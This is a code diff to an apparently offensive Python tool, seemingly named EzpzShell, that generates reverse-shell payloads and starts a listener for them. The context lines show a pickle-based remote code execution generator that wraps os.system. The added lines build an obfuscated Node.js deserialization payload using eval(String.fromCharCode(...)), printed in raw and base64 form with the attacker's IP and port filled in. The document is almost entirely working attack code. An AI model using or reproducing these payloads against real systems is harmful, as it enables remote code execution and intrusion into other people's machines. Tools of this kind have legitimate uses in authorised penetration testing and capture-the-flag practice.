@@ -31,7 +31,7 @@ def header():
 \n[Usage]\n{colors.ORANGE}python3 {sys.argv[0]} 10.10.10.10 9001 py\n{colors.ORANGE}python3 {sys.argv[0]} tun0 9001 py{colors.RESET}''')
 
 def load_shell():
-	listShell = open("/opt/OtherTools/EazyH0j3n/EzpzShell/shell.txt").read()
+	listShell = open("/opt/OtherTools/H0j3n/EzpzShell/shell.txt").read()
 	for counter,i in enumerate(str(listShell).split("#INDEX")[1:]):
 		for j in i.split("#EXAMPLE")[1:]:
 			payload[list(payload.keys())[counter]].append(j)
@@ -47,6 +47,12 @@ def pickle_rce(ip,port):
 			import os
 			return (os.system,(command,))
 	return base64.b64encode(pickle.dumps(rce()))
+	
+def char_encode(payload):
+	encoded_payload = ""
+	for char in payload:
+		encoded_payload = encoded_payload + "," + str(ord(char))
+	return encoded_payload[1:]
 	
 payload = {
 	"py":[],
@@ -98,6 +104,13 @@ if __name__ == "__main__":
 		elif "{PICKLE}" in j:
 			temp = pickle_rce(ip,port)
 			print(j.strip().replace("{PICKLE}",temp.decode("ascii")))
+		elif "{NODEJS_DESERIALIZATION}" in j:
+			temp = j.strip().replace("{NODEJS_DESERIALIZATION}","").replace("{IP}",ip).replace("{PORT}",port).strip()
+			temp2 = char_encode(temp)
+			print('{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2)
+			base64payload = '{"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}' % temp2
+			print(f"\n{base64.b64encode(base64payload.encode('ascii')).decode('ascii')}")
+			
 		else:
 			print(j.strip().replace("{IP}",ip).replace("{PORT}",port))
 	print(F"\n{colors.CYAN}[*]{colors.RESET} {colors.WHITEBOLD}Starting the listener on {ip}:{port}\n")
